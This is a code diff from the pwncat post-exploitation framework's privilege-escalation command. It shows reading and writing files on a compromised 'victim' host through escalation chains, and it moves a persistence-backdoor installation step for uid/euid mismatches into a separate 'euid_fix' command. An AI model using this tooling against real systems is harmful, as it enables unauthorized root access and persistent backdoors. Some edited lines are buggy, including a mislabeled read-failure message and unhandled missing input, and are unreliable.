@@ -11,7 +11,7 @@ from pwncat.commands.base import (
     StoreConstOnce,
     StoreForAction,
 )
-from pwncat import util, privesc
+from pwncat import privesc
 from pwncat.persist import PersistenceError
 from pwncat.util import State, console
 from colorama import Fore
@@ -137,7 +137,7 @@ class Command(CommandDefinition):
                 read_pipe, chain, technique = pwncat.victim.privesc.read_file(
                     args.path, args.user, args.max_depth
                 )
-                util.success(f"file successfully opened with {technique}!")
+                console.log(f"file [green]opened[/green] with {technique}")
 
                 # Read the data from the pipe
                 shutil.copyfileobj(read_pipe, sys.stdout.buffer)
@@ -147,7 +147,7 @@ class Command(CommandDefinition):
                 pwncat.victim.privesc.unwrap(chain)
 
             except privesc.PrivescError as exc:
-                util.error(f"read file failed: {exc}")
+                console.log(f"file write [red]failed[/red]")
         elif args.action == "write":
             # Make sure the correct arguments are present
             if not args.path:
@@ -159,8 +159,8 @@ class Command(CommandDefinition):
             try:
                 with open(args.data, "rb") as f:
                     data = f.read()
-            except PermissionError:
-                self.parser.error(f"no local permission to read: {args.data}")
+            except (PermissionError, FileNotFoundError):
+                console.log(f"{args.data}: no such file or directory")
 
             try:
                 # Attempt to write the data to the remote file
@@ -168,47 +168,25 @@ class Command(CommandDefinition):
                     args.path, data, target_user=args.user, depth=args.max_depth,
                 )
                 pwncat.victim.privesc.unwrap(chain)
-                util.success("file written successfully!")
+                console.log("file write [green]succeeded[/green]")
             except privesc.PrivescError as exc:
-                util.error(f"file write failed: {exc}")
+                console.log(f"file write [red]failed[/red]: {exc}")
         elif args.action == "escalate":
             try:
                 chain = pwncat.victim.privesc.escalate(
                     args.user, depth=args.max_depth, exclude=args.exclude
                 )
 
-                ident = pwncat.victim.id
-                if ident["euid"]["id"] == 0 and ident["uid"]["id"] != 0:
-                    util.progress(
-                        "mismatched euid and uid; attempting backdoor installation."
-                    )
-                    for method in pwncat.victim.persist.available:
-                        if not method.system or not method.local:
-                            continue
-                        try:
-                            # Attempt to install this persistence method
-                            pwncat.victim.persist.install(method.name)
-                            if not method.escalate():
-                                # The escalation didn't work, remove it and try the next
-                                pwncat.victim.persist.remove(method.name)
-                                continue
-                            chain.append(
-                                (
-                                    f"{method.format()} ([cyan]euid[/cyan] correction)",
-                                    "exit",
-                                )
-                            )
-                            break
-                        except PersistenceError:
-                            continue
-                    else:
-                        util.warn("failed to correct uid/euid mismatch")
-
                 console.log("privilege escalation succeeded using:")
                 for i, (technique, _) in enumerate(chain):
                     arrow = f"[yellow]\u2ba1[/yellow] "
                     console.log(f"{(i+1)*' '}{arrow}{technique}")
+
+                ident = pwncat.victim.id
+                if ident["euid"]["id"] == 0 and ident["uid"]["id"] != 0:
+                    pwncat.victim.command_parser.dispatch_line("euid_fix")
+
                 pwncat.victim.reset()
                 pwncat.victim.state = State.RAW
             except privesc.PrivescError as exc:
-                util.error(f"escalation failed: {exc}")
+                console.log(f"privilege escalation [red]failed[/red]: {exc}")
